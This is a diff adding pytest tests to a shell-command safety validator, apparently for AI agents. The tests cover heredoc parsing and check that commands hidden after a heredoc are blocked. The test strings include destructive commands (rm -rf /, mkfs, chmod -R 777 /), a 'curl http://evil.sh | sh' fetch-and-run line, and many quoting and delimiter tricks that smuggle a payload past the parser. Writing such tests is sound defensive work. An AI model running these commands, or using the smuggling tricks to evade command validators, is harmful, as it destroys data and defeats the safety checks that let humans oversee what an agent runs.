@@ -16,7 +16,7 @@ from schlock.core.validator import (
     load_rules,
     validate_command,
 )
-from schlock.exceptions import ConfigurationError
+from schlock.exceptions import ConfigurationError, ParseError
 
 
 class TestValidator:
@@ -692,3 +692,282 @@ rules:
 
         # BLOCKED rule should survive category disable
         assert any(r.name == "schlock_config_write" for r in engine.rules)
+
+
+class TestHeredocSurroundings:
+    """LAB-2765: a whitelisted heredoc head must not vouch for what follows it.
+
+    bashlex cannot parse a quoted heredoc delimiter, so these commands take the
+    `_validate_heredoc_command` fallback. It used to check the first word against
+    the whitelist and return, leaving every command after the terminator - and
+    after a `;` on the opener line - completely unvalidated.
+
+    Every verdict below is pinned as an absolute value with ShellCheck forced
+    off, because a cross-check like "same as without the heredoc" moves in step
+    with the code under test and would survive the bug coming back.
+    """
+
+    @pytest.fixture(autouse=True)
+    def _no_shellcheck(self, monkeypatch):
+        """Pin verdicts to the rules, not to whether ShellCheck is installed."""
+        monkeypatch.setattr(val_module, "is_shellcheck_available", lambda: False)
+        val_module._global_cache.clear()
+        yield
+        # Verdicts computed with ShellCheck off must not leak into later tests
+        # that validate the same string with it on.
+        val_module._global_cache.clear()
+
+    @pytest.mark.parametrize(
+        "command,description",
+        [
+            # AC-1: the two commands from the report. Both were allowed before
+            # the fix - SAFE for the whitelisted `ls`, LOW for `git status`.
+            ("ls << 'EOF'\nx\nEOF\nrm -rf /", "whitelisted head, rm -rf / after terminator"),
+            ("git status <<'EOF'\nx\nEOF\nmkfs.ext4 /dev/sda", "whitelisted prefix, mkfs after terminator"),
+            # Same hole, other spellings.
+            ("python3 << 'EOF'\nx\nEOF\nrm -rf /", "non-whitelisted head does not excuse it either"),
+            ('ls << "EOF"\nx\nEOF\nrm -rf /', "double-quoted delimiter"),
+            ("ls << 'EOF' ; rm -rf /\nx\nEOF", "`;` tail on the opener line, before the body"),
+            ("cat << 'A' << 'B'\n1\nA\n2\nB\nrm -rf /", "two heredocs, both bodies consumed in order"),
+            ("cat << 'A' << B\n1\nA\n2\nB\nrm -rf /", "quoted and bare delimiters mixed"),
+            ("ls << 'A'\n1\nA\ncat << 'B'\n2\nB\nrm -rf /", "second heredoc opens on a later line"),
+            ("cat << 'EOF'\nEOFX\n  EOF\nEOF\nrm -rf /", "body lines that only look like the terminator"),
+            ("cat << 'EOF' > out.txt\nfoo\nEOF\nrm -rf /", "heredoc redirected to a file, then rm"),
+            ("ls <<- 'EOF'\n\tx\n\tEOF\nrm -rf /", "tab-stripped `<<-` heredoc"),
+            ("for f in a b; do cat << 'EOF'\nx\nEOF\ndone\nrm -rf /", "after a compound statement's closer"),
+            # The rewrite has to read the delimiter the way bash does - the whole
+            # word, quotes removed - or the body swallows the payload. Reading
+            # only `\w+` stops at `-`/`.`/space; reading only the first quoted
+            # run turns `"E"OF` into `E`.
+            ("ls <<'EOF-X'\nbody\nEOF-X\nrm -rf /", "delimiter containing a dash"),
+            ("ls <<'E.F'\nbody\nE.F\nrm -rf /", "delimiter containing a dot"),
+            ("ls <<'E F'\nbody\nE F\nrm -rf /", "delimiter containing a space"),
+            ('ls << "E"OF\nEOF\nrm -rf /\nE\nEOF', "delimiter split across a double-quoted run"),
+            ("ls << 'E'OF\nEOF\nrm -rf /\nE\nEOF", "delimiter split across a single-quoted run"),
+            ("ls <<\\EOF\nEOF\nrm -rf /", "backslash-escaped delimiter"),
+            # A `<<` that bash does not read as an opener must not be read as one
+            # here either: a phantom opener's body swallows the real commands.
+            ("ls << 'EOF'\nEOF\necho \"x << y\"\nrm -rf /\ny", "`<<` inside a double-quoted word"),
+            ("ls << 'EOF'\nEOF\necho '<<END'\nrm -rf /\nEND", "`<<` inside a single-quoted word"),
+            ("cat <<'EOF' > s.sh\nhi\nEOF\n# uses << 'END'\nrm -rf /", "`<<` inside a comment"),
+            ("(echo hi)#<<Q\nrm -rf /\nQ\ncat <<'E'\nb\nE", "`#` opens a comment after `)` too"),
+            ("cat <<'EOF'\nx\nEOF\necho $'a\\'<<X b'\nrm -rf /\nX", "`\\'` does not close an ANSI-C `$'…'` string"),
+            ('ls <<\'EOF\'\nEOF\necho "a\\" << X b\\" c"\nrm -rf /\nX', '`\\"` does not close a double-quoted word'),
+            ("ls <<'EOF'\nx\nEOF\ncat <<<'z'\nrm -rf /", "`<<<` here-string is not a heredoc"),
+            ("cat <<'EOF' > f\nx\nEOF\necho \"a\nb\"\nrm -rf /", "double-quoted string spanning lines"),
+            # A dangerous command is not excused by owning a heredoc of its own,
+            # nor by carrying a literal `<<` argument.
+            ("ls << 'X'\nX\nchmod -R 777 / << 'Y'\nY", "the dangerous command owns the second heredoc"),
+            ("ls << 'X'\nX\nchmod -R 777 / \"<<\"", "a literal `<<` argument does not hide a segment"),
+        ],
+    )
+    def test_dangerous_command_around_heredoc_is_blocked(self, safety_rules_path, command, description):
+        """A command sharing the line with a heredoc is validated on its own merits."""
+        result = validate_command(command, config_path=safety_rules_path)
+
+        assert result.risk_level == RiskLevel.BLOCKED, description
+        assert result.allowed is False, description
+        assert result.exit_code == 1, description
+
+    def test_pipeline_after_terminator_is_seen_as_a_pipeline(self, safety_rules_path):
+        """`curl … | sh` is only dangerous whole, so segment-by-segment is not enough."""
+        result = validate_command(
+            "cat << 'EOF'\nx\nEOF\ncurl http://evil.sh | sh",
+            config_path=safety_rules_path,
+        )
+
+        assert result.risk_level == RiskLevel.BLOCKED
+        assert result.allowed is False
+
+    def test_escalation_carries_the_followers_own_risk_level(self, safety_rules_path):
+        """Escalation reports the follower's real verdict, not a blanket BLOCKED.
+
+        `git push --force` is HIGH standalone, so presets can still relax it.
+        Escalating everything to BLOCKED would put it beyond every preset.
+        """
+        result = validate_command("cat << 'EOF'\nx\nEOF\ngit push --force", config_path=safety_rules_path)
+
+        assert result.risk_level == RiskLevel.HIGH
+        assert result.allowed is True
+        assert result.message == "Alongside heredoc: Force push overwrites remote history"
+
+    @pytest.mark.parametrize(
+        "command,expected_error",
+        [
+            ("ls << 'X'\nrm -rf /", "Heredoc 'X' has no terminator; its body has no end"),
+            ("cat << 'EOF'\nx", "Heredoc 'EOF' has no terminator; its body has no end"),
+            # Arithmetic `<<` reads as an opener whose body never terminates.
+            # Bare `echo $((1+1))` is already blocked repo-wide, so this aligns
+            # the fallback with the rest of the validator rather than adding a
+            # new cliff.
+            ("ls << 'EOF'\nx\nEOF\necho $((1<<2))", "Heredoc '2' has no terminator; its body has no end"),
+            ("cat << ''\nx\nEOF", "Heredoc opener with an empty delimiter"),
+            # A stray separator survives the rewrite and fails bashlex there.
+            ("ls << 'EOF'\nx\nEOF\n; rm -rf /", "unexpected token ';'"),
+            # An opener on a line that does not end there: bash starts the body
+            # after the line that finishes the command, so consuming from the
+            # next one would delete the commands in between. Denied either way,
+            # which costs a false positive on the benign spelling - the shape is
+            # rare, and reading it wrong drops a payload silently.
+            ("cat <<'EOF' \\\n&& rm -rf /\nhello\nEOF", "line that continues"),
+            ("cat <<'EOF' \\\n&& echo ok\nhello\nEOF", "line that continues"),
+        ],
+    )
+    def test_unreadable_heredoc_fails_closed(self, safety_rules_path, command, expected_error):
+        """Not knowing where a body ends means not knowing which text is shell.
+
+        The reason is asserted, not just the verdict. A mis-lexed opener denies
+        too - by inventing a heredoc that never terminates - so `BLOCKED` alone
+        would pass with the lexer's context tracking removed (LAB-1584).
+        """
+        result = validate_command(command, config_path=safety_rules_path)
+
+        assert result.risk_level == RiskLevel.BLOCKED
+        assert result.allowed is False
+        assert expected_error in (result.error or "")
+        assert result.message.startswith("BLOCKED: Cannot determine what this heredoc runs")
+
+    def test_unterminated_quote_in_a_delimiter_is_rejected(self):
+        """A delimiter whose quote never closes has no readable end.
+
+        Pinned directly: bashlex blames the unmatched quote rather than the
+        here-document, so `validate_command` denies before the fallback runs and
+        cannot reach this branch. Without it the reader would run to end of line
+        and hand back a delimiter bash never had.
+        """
+        with pytest.raises(ParseError, match="Unterminated"):
+            val_module._read_delimiter("'EOF", 0)
+
+    @pytest.mark.parametrize(
+        "command,expected_risk,description",
+        [
+            # AC-2: the pre-fix verdict for legitimate heredoc use, unchanged.
+            ("cat << 'EOF'\nhello\nEOF", RiskLevel.LOW, "benign body, nothing after"),
+            ("ls << 'EOF'\nx\nEOF", RiskLevel.SAFE, "whitelisted head, nothing after"),
+            # The whitelist is consulted on the head word alone. Passing the
+            # whole opener line instead would make `^git\\s+status` match and
+            # report SAFE, quietly widening what a heredoc head can vouch for.
+            ("git status << 'EOF'\nx\nEOF", RiskLevel.LOW, "whitelist is checked on the head word only"),
+            ("cat << 'EOF'\nx\nEOF\necho done", RiskLevel.LOW, "benign trailing command"),
+            # Compound statements leave a block closer after the terminator.
+            # `done` and `fi` are not commands and never parse alone, so a fix
+            # that validated the trailing text as a standalone command would
+            # fail-close all three of these.
+            ("for f in a b; do cat << 'EOF'\nx\nEOF\ndone", RiskLevel.LOW, "heredoc inside a for loop"),
+            ("if true; then cat << 'EOF'\nx\nEOF\nfi", RiskLevel.LOW, "heredoc inside an if block"),
+            (
+                "while read x; do cat << 'EOF'\nx\nEOF\ndone < input.txt",
+                RiskLevel.LOW,
+                "heredoc inside a while loop with a redirect on the closer",
+            ),
+            ("greet() {\n  cat << 'EOF'\nhi\nEOF\n}", RiskLevel.LOW, "heredoc inside a function body"),
+            # The opener line can continue the heredoc's own command rather than
+            # start a new one.
+            ("cat << 'EOF' | grep x\nfoo\nEOF", RiskLevel.LOW, "piped into grep"),
+            ("cat << 'EOF' > out.txt\nfoo\nEOF", RiskLevel.LOW, "redirected to a file"),
+            ("cat << 'EOF' && echo ok\nfoo\nEOF", RiskLevel.LOW, "&& a benign command"),
+            # A quoted delimiter means the body is literal text. Rewriting it to
+            # a bare delimiter would make bash expand it, so the body must be
+            # discarded rather than re-parsed (heredoc-body substitution is
+            # LAB-2756's problem, and stays out of scope here).
+            ("cat << 'EOF'\n$(rm -rf /)\nEOF", RiskLevel.LOW, "substitution in the body stays literal"),
+            ("cat << 'EOF'\n$(rm -rf /)\nEOF\necho ok", RiskLevel.LOW, "literal body plus benign trailer"),
+            ("cat << 'EOF'\nit's \"fine\" << here\nEOF\necho ok", RiskLevel.LOW, "quotes and `<<` in the body"),
+            # Delimiter spellings other than single-quoted, and openers the old
+            # entry regex rejected outright - each was a hard BLOCKED before.
+            ('cat << "EOF"\nhello\nEOF', RiskLevel.LOW, "double-quoted delimiter, benign"),
+            ('cat << "EOF"\nx\nEOF\necho done', RiskLevel.LOW, "double-quoted delimiter, benign trailer"),
+            ("cat << 'A' << B\n1\nA\n2\nB", RiskLevel.LOW, "quoted and bare delimiters mixed"),
+            ("cat << 'A' << 'B'\n1\nA\n2\nB", RiskLevel.LOW, "two quoted delimiters on one line"),
+            ("ls <<- 'EOF'\n\tx\n\tEOF", RiskLevel.SAFE, "tab-stripped `<<-`, whitelisted head"),
+            ("cat <<- 'EOF'\n\tx\n\tEOF\necho ok", RiskLevel.LOW, "tab-stripped `<<-`, benign trailer"),
+            ("cat <<'EOF-X'\nx\nEOF-X\necho ok", RiskLevel.LOW, "delimiter containing a dash, benign"),
+            ("cat << 'EOF'\nx\nEOF\n# just a note", RiskLevel.LOW, "a comment after the terminator"),
+            # A `<<` bash does not read as an opener must not be read as one
+            # here either. Reading these as openers denies all four, because the
+            # phantom body then has no terminator.
+            ("cat << 'EOF'\nx\nEOF\n# see << 'END' below", RiskLevel.LOW, "`<<` inside a comment"),
+            ("cat << 'EOF'\nx\nEOF\necho \"a << b\"", RiskLevel.LOW, "`<<` inside a double-quoted word"),
+            ("cat << 'EOF'\nx\nEOF\necho 'a << b'", RiskLevel.LOW, "`<<` inside a single-quoted word"),
+            ("cat << 'EOF'\nx\nEOF\necho \"a\nb << c\"", RiskLevel.LOW, "`<<` inside a multi-line quoted word"),
+            ("cat << 'EOF'\nx\nEOF\ncat <<<'z'", RiskLevel.LOW, "`<<<` here-string after the terminator"),
+            ("cat << 'EOF'\nx\nEOF\necho $'a\\'<<X b'", RiskLevel.LOW, "`<<` inside an ANSI-C `$'…'` string"),
+            ('cat << \'EOF\'\nx\nEOF\necho "a\\" << X b\\" c"', RiskLevel.LOW, '`<<` past an escaped `\\"`'),
+            # Quote context has to reach the rule engine here too, or a commit
+            # message quoting a dangerous command is a hard BLOCK on a routine
+            # commit - and escalation only raises, so nothing could undo it.
+            (
+                "git commit -m \"never rm -rf / here\" <<'EOF'\nx\nEOF",
+                RiskLevel.LOW,
+                "a dangerous-looking quoted argument on the opener line",
+            ),
+            ("cat <<'EOF' | <<'X'\nx\nEOF\ny\nX", RiskLevel.LOW, "a segment that is only a redirection"),
+            # Delimiter spellings whose quote removal has to happen across the
+            # whole word: reading only the first quoted run gives `E`, and the
+            # body then runs to a line reading `E` instead of `EOF`.
+            ('cat << "E"OF\nx\nEOF\necho ok', RiskLevel.LOW, "delimiter split across a double-quoted run"),
+            ("cat << 'E'OF\nx\nEOF\necho ok", RiskLevel.LOW, "delimiter split across a single-quoted run"),
+            ("cat <<\\EOF\nx\nEOF\necho ok", RiskLevel.LOW, "backslash-escaped delimiter"),
+            ("cat <<'EOF' > f\nx\nEOF\necho \"a\nb\"", RiskLevel.LOW, "double-quoted string spanning lines"),
+            ("cat <<'A' > f1\nx\nA\ncat <<'B' > f2\ny\nB", RiskLevel.LOW, "two files written in one call"),
+            ("python3 << 'EOF'\nprint(1)\nEOF", RiskLevel.LOW, "python heredoc"),
+            ("ssh host << 'EOF'\nuptime\nEOF", RiskLevel.LOW, "ssh heredoc"),
+        ],
+    )
+    def test_legitimate_heredoc_keeps_its_verdict(self, safety_rules_path, command, expected_risk, description):
+        """Escalation only ever raises risk, and only when something raises it."""
+        result = validate_command(command, config_path=safety_rules_path)
+
+        assert result.risk_level == expected_risk, f"{description}: {result.message}"
+        assert result.allowed is True, f"{description}: {result.message}"
+        assert result.exit_code == 0, description
+
+    def test_rewrite_replaces_the_body_and_the_delimiter(self):
+        """The rewrite keeps structure and discards content, whatever the body's size.
+
+        `<<-` is pinned here as well as end-to-end: bash lets the terminator be
+        indented with tabs, and comparing the raw line instead of the
+        tab-stripped one would run the body past its terminator and swallow the
+        trailing command.
+        """
+        body = "\n".join(["x"] * 5000)
+        neutered, base = val_module._neuter_heredocs(f"ls <<- 'EOF'\n\t{body}\n\tEOF\nrm -rf /")
+
+        assert neutered == "ls <<-SCHLOCK_HEREDOC\n\nSCHLOCK_HEREDOC\nrm -rf /"
+        assert base == "ls"
+
+    def test_rewrite_denies_a_command_with_no_opener_it_can_see(self):
+        """Reaching the fallback means bashlex blamed a heredoc; finding none means we misread it.
+
+        Returning the base verdict here instead would restore the original
+        fail-open for every opener spelling the lexer cannot follow.
+        """
+        with pytest.raises(ParseError):
+            val_module._neuter_heredocs("echo hello")
+
+    def test_escalation_does_not_revalidate_an_unchanged_command(self, safety_rules_path, monkeypatch):
+        """A rewrite that changed nothing would re-enter this fallback forever.
+
+        Unreachable today - every command that gets here fails to parse, and an
+        unchanged command would fail identically - so it is pinned directly
+        rather than left as an argument in a comment.
+        """
+        monkeypatch.setattr(val_module, "_neuter_heredocs", lambda command: (command, "cat"))
+        seen = []
+        real = val_module.validate_command
+
+        def spy(command, config_path=None):
+            seen.append(command)
+            return real(command, config_path)
+
+        monkeypatch.setattr(val_module, "validate_command", spy)
+        val_module._escalate_past_heredoc(
+            val_module._get_rule_engine(safety_rules_path),
+            "cat <<SCHLOCK_HEREDOC\n\nSCHLOCK_HEREDOC\necho ok",
+            "cat <<SCHLOCK_HEREDOC\n\nSCHLOCK_HEREDOC\necho ok",
+            val_module.ValidationResult(allowed=True, risk_level=RiskLevel.LOW, message="base"),
+            safety_rules_path,
+        )
+
+        assert "cat <<SCHLOCK_HEREDOC\n\nSCHLOCK_HEREDOC\necho ok" not in seen
+        assert seen == ["cat", "echo ok"]
